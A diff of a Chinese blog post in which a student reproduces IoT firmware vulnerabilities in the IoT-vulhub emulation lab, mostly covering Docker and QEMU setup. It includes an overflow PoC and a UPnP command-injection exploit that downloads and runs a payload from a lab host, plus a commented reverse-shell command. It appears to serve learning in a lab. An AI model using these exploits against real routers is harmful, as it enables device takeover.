@@ -1,74 +1,150 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-  <title>
-    
-    Iot-vulhub复现 丨
-    
-
-    tw11ty&#39;s Blog
-  </title>
-
+  <meta charset="utf-8">
   
-  <link rel="shortcut icon" href="/icon.svg">
   
-
-  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  <title>Iot-vulhub复现 | tw11ty</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。 由于我的服务器是国内的，所以构建过程会有很多麻烦，而且dockerhub也g了…… 目录- 环境构建  基础环境构建 漏洞环境构建  -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Iot-vulhub复现">
+<meta property="og:url" content="http://tw11ty.github.io/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="tw11ty">
+<meta property="og:description" content="借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。 由于我的服务器是国内的，所以构建过程会有很多麻烦，而且dockerhub也g了…… 目录- 环境构建  基础环境构建 漏洞环境构建  -">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903763.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903687.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902277.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903524.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903795.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903991.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902852.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251904405.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902945.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251859341.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251900140.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251923337.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251953973.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406252002547.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261004016.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260004775.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260909274.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260912255.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260914069.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260916879.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261029907.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406260045636.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406261030685.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262320963.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262355451.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271159313.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270002901.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270004520.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271205845.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271207669.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271926418.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913673.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913451.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170935339.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170936295.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171034660.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171033321.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171040100.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171039126.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171111502.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171118223.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171324298.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171410301.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272301792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406272304282.png">
+<meta property="article:published_time" content="2024-06-25T10:46:14.000Z">
+<meta property="article:modified_time" content="2024-07-17T06:43:26.009Z">
+<meta property="article:author" content="tw11ty">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903763.png">
   
-  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
-  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+    <link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
   
-
-  <!-- 字体 -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
-
   
-<link rel="stylesheet" href="/css/root.css">
-
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
   
 <link rel="stylesheet" href="/css/style.css">
 
   
-<link rel="stylesheet" href="/css/post.css">
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-<link rel="alternate" href="/atom.xml" title="tw11ty" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+  
+  
+</head>
 
 <body>
-  <header class="header">
-  <section class="header-container">
-    <a class="logo" href="/">tw11ty</a>
-    <ul class="nav">
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">tw11ty</a>
+      </h1>
       
-      <li><a href="/archives">归档</a></li>
-      
-      <li><a href="/about">关于</a></li>
-      
-      <li><a href="/group">友链</a></li>
-      
-    </ul>
-  </section>
-</header>
-  <main class="main">
-    <article class="post">
-  
-  <div class="post-title">Iot-vulhub复现</div>
-  <div class="post-meta">
-    <div class="date">2024 June 25th</div>
-    <div class="tags">
-      
-      <div class="tag-item">IOT</div>
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">MyBlog</a>
+        </h2>
       
     </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://tw11ty.github.io"></form>
+      </div>
+    </div>
   </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Iot-vulhub复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="2024-06-25T10:46:14.000Z" itemprop="datePublished">2024-06-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Iot-vulhub复现
+    </h1>
   
 
-  <main class="post-content"><p>借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了<a target="_blank" rel="noopener" href="https://github.com/Vu1nT0tal/IoT-vulhub">Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)</a>，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。</p>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>借着逆向课的作业，就借此机会来简单学习并复现iot固件漏洞。网上搜集资料找到了<a target="_blank" rel="noopener" href="https://github.com/Vu1nT0tal/IoT-vulhub">Vu1nT0tal&#x2F;IoT-vulhub: IoT固件漏洞复现环境 (github.com)</a>，感觉该项目对0基础入门iot固件漏洞复现是蛮有帮助的，就以此对相关漏洞进行复现。</p>
 <p>由于我的服务器是国内的，所以构建过程会有很多麻烦，而且dockerhub也g了……</p>
 <h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#env">环境构建</a></p>
 <ul>
@@ -133,21 +209,19 @@
 <p>查看文件相关信息  32位 小端序 mips架构</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903687.png" alt="image-20240623135819202"></p>
 <p>1.构建、启动漏洞环境：</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./init_env.sh mipsel
-docker-compose -f docker-compose-system.yml build</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./init_env.sh mipsel</span><br><span class="line">docker-compose -f docker-compose-system.yml build</span><br></pre></td></tr></table></figure>
 
 <p>a.缺少firmianay&#x2F;qemu-system:mipsel，自行本地构建，去到对应的文件夹IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel创建镜像</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">docker build -t firmianay/qemu-system:mipsel .</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t firmianay/qemu-system:mipsel .</span><br></pre></td></tr></table></figure>
 
 <p>b.构建时COPY命令出错，由于高版本docker会对文件名检测，需要修改Dockerfile</p>
-<pre class=" language-highlight Dockerfile">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"><code class="language-highlight Dockerfile">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"> ./firmware/_*/squashfs-root /root/squashfs-root</span>
-ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to build: When using <span class="keyword">COPY</span><span class="language-bash"> with more than one <span class="built_in">source</span> file, the destination must be a directory and end with a /</span></code></pre>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">COPY</span><span class="language-bash"> ./firmware/_*/squashfs-root /root/squashfs-root</span></span><br><span class="line">ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to build: When using <span class="keyword">COPY</span><span class="language-bash"> with more than one <span class="built_in">source</span> file, the destination must be a directory and end with a /</span></span><br></pre></td></tr></table></figure>
 
 <p>c.将firmware下子文件夹内的squashfs-root提取到firmware里，修改Dockerfile的步骤为  COPY .&#x2F;firmware&#x2F;squashfs-root &#x2F;root&#x2F;squashfs-root</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">cp -r ./_TOTOLINK_NR1800X_B20210910_ALL.bin.extracted/squashfs-root/ ./</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./_TOTOLINK_NR1800X_B20210910_ALL.bin.extracted/squashfs-root/ ./</span><br></pre></td></tr></table></figure>
 
 <p>2.启动容器</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">docker-compose -f docker-compose-system.yml up</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -f docker-compose-system.yml up</span><br></pre></td></tr></table></figure>
 
 <p>d.运行爆错TOTO-system   | &#x2F;bin&#x2F;sh: 1: .&#x2F;run.sh: Permission denied，服务没起起来</p>
 <blockquote>
@@ -157,24 +231,13 @@ ERROR: Service <span class="string">&#x27;system-emu&#x27;</span> failed to buil
 <blockquote>
 <p>修改&#x2F;iot_hub&#x2F;IoT-vulhub-master&#x2F;baseImage&#x2F;qemu-system&#x2F;mipsel&#x2F;images&#x2F;download.sh，原链接改为<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a></p>
 </blockquote>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">vim ./download.sh
-#!/bin/bash
-
-# 3.2.0
-wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
-wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
-
-# 2.6.32
-wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
-wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta
-
-./download.sh</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim ./download.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># 3.2.0</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span><br><span class="line"></span><br><span class="line"># 2.6.32</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta</span><br><span class="line"></span><br><span class="line">./download.sh</span><br></pre></td></tr></table></figure>
 
 <p>服务启动成功！</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251902277.png" alt="image-20240623143052731"></p>
 <p>3.开启ssh隧道</p>
 <p>本地使用ssh创建socks代理，然后浏览器配置代理</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">ssh -D 10006 root@124.221.122.67 -p 1234</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 10006 root@124.221.122.67 -p 1234</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903524.png" alt="image-20240623153609456"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251903795.png" alt="image-20240623152246628"></p>
@@ -217,12 +280,7 @@ wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta
 </blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406251859341.png" alt="image-20240625185942262"></p>
 <h3 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h3><p>先自行构建qemu-system镜像</p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">cd ~/iot_hub/IoT-vulhub-master/baseImage/qemu-system/armel/images
-./download.sh   #记得改链接
-<span class="meta prompt_"></span>
-<span class="meta prompt_">#</span><span class="language-bash">镜像构建</span>
-docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd ~/iot_hub/IoT-vulhub-master/baseImage/qemu-system/armel/images</span><br><span class="line">./download.sh   #记得改链接</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">镜像构建</span></span><br><span class="line">docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>如果构建qemu-system时gef拉取不下来就注释掉</p>
 <p> 然后跟着手册走</p>
@@ -239,19 +297,7 @@ docker build -t firmianay/qemu-system:$&#123;ARCH&#125; .
 <p>程序没有对Content-length字段进行校验，直接将输入的消息赋值给了local_38中，而local_38距离栈底只有0x38字节</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406252002547.png" alt="image-20240625200208487"></p>
 <p>poc</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!usr/bin/python</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">import</span> requests
-
-header = &#123;
-	<span class="string">"Content-Length"</span>:<span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"</span>
-&#125;
-
-url = <span class="string">"http://192.168.2.2"</span> + <span class="string">"/cgi-bin/admin/upgrade.cgi"</span>
-
-
-session = requests.session()
-session.post(url, headers=header)</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">	<span class="string">&quot;Content-Length&quot;</span>:<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.2&quot;</span> + <span class="string">&quot;/cgi-bin/admin/upgrade.cgi&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url, headers=header)</span><br></pre></td></tr></table></figure>
 
 
 
@@ -302,38 +348,7 @@ session.post(url, headers=header)</code></pre>
 <p>a0源操作数，a1为size，a2为格式化字符，a3为指定格式化的数据</p>
 <p>a0又是snprintf的源操作数，也是system调用的参数，最后会执行system(a0)</p>
 <p>exp:最终执行cmd</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/python3</span>
-
-<span class="keyword">import</span> requests
-<span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> threading <span class="keyword">import</span> Thread
-
-<span class="comment"># cmd = "busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 7777 -e /bin/sh"</span>
-cmd  = <span class="string">&#x27;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\n&#x27;</span>
-cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>
-cmd += <span class="string">&#x27;/msf&#x27;</span>
-
-<span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) < <span class="number">255</span>)
-
-data = <span class="string">"<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$("</span> + cmd + <span class="string">")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"</span>
-url = <span class="string">"http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1"</span>
-
-<span class="keyword">def</span> <span class="title function_">attack</span>():
-    <span class="keyword">try</span>:
-        requests.post(url, auth=HTTPDigestAuth(<span class="string">&#x27;dslf-config&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>), data=data)
-    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
-        <span class="built_in">print</span>(e)
-
-thread = Thread(target=attack)
-thread.start()
-
-io = listen(<span class="number">31337</span>)
-io.wait_for_connection()
-log.success(<span class="string">"getshell"</span>)
-io.interactive()
-
-thread.join()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd = &quot;busybox wget -g 192.168.2.1 -P 8000 -l /tmp/busybox -r /tools/busybox ; chmod +x /tmp/busybox ; /tmp/busybox nc 192.168.2.1 7777 -e /bin/sh&quot;</span></span><br><span class="line">cmd  = <span class="string">&#x27;wget -g 192.168.2.1 -P 8000 -r /tools/msf -l /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;/msf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n    &lt;s:Envelope xmlns:s=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot; s:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;\n    &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\&quot;urn:schemas-upnp-org:service:WANPPPConnection:1\&quot;&gt;\n    &lt;NewStatusURL&gt;$(&quot;</span> + cmd + <span class="string">&quot;)&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n    &lt;/s:Body&gt;\n    &lt;/s:Envelope&gt;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, auth=HTTPDigestAuth(<span class="string">&#x27;dslf-config&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>), data=data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">thread = Thread(target=attack)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">31337</span>)</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">thread.join()</span><br></pre></td></tr></table></figure>
 
 
 
@@ -359,8 +374,8 @@ thread.join()</code></pre>
 </blockquote>
 <p>docker内进行端口转发(Docker-compose.yml中写好了端口映射)</p>
 <blockquote>
-<p>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#46;&#x31;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#46;&#x31;</a> -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666</p>
-<p>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#49;">&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#x2e;&#49;</a> -f -N -g -R 0.0.0.0:80:192.168.2.2:80</p>
+<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;">&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;</a> -f -N -g -R 0.0.0.0:6666:192.168.2.2:6666</p>
+<p>ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#46;&#48;&#46;&#x31;">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#46;&#48;&#46;&#x31;</a> -f -N -g -R 0.0.0.0:80:192.168.2.2:80</p>
 </blockquote>
 <p>nmap可以扫到服务  8888–漏洞服务    6666–gdbserver</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406262320963.png" alt="image-20240626231935303"></p>
@@ -374,28 +389,7 @@ thread.join()</code></pre>
 <p>官方手册</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406270004520.png" alt="image-20240627000444482"></p>
 <p>要求GDB 8.0以上，Python3.6+，修改更麻烦了，干脆不装gef了，把gef那行注释掉</p>
-<pre class=" language-highlight Dockerfile"><span class="keyword"><code class="language-highlight Dockerfile"><span class="keyword">FROM</span> firmianay/ubuntu1604                                                                                                                
-<span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">"firmianay@gmail.com"</span>                                                                                                       </span>
-                                                                                                                                         
-<span class="keyword">WORKDIR</span><span class="language-bash"> /root                                                                                                                            </span>
-                                                                                                                                         
-<span class="keyword">RUN</span><span class="language-bash"> apt-get update \                                                                                                                     </span>
-    && apt-get install -y qemu-system-mipsel \                                                                                           
-    && apt-get install -y --no-install-recommends bridge-utils uml-utilities expect gdb-multiarch git python3-dev openssh-server netcat curl libssl-dev libffi-dev build-essential tcpdump \                                                                                      
